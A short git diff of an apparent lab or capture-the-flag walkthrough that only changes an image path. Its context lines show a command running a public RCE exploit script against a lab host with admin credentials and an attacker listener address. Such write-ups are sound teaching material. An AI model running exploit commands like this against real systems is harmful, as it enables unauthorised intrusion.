@@ -85,7 +85,7 @@ We can then run the RCE exploit `48241.py`:
 $ python3 48241.py https://192.168.233.57:8081 admin abgrtyu 192.168.45.161 21
 ```
 
-<figure><img src="../../../.gitbook/assets/image (42).png" alt=""><figcaption></figcaption></figure>
+<figure><img src="../../../.gitbook/assets/image (42) (9).png" alt=""><figcaption></figcaption></figure>
 
 We can then grab the user flag.
 
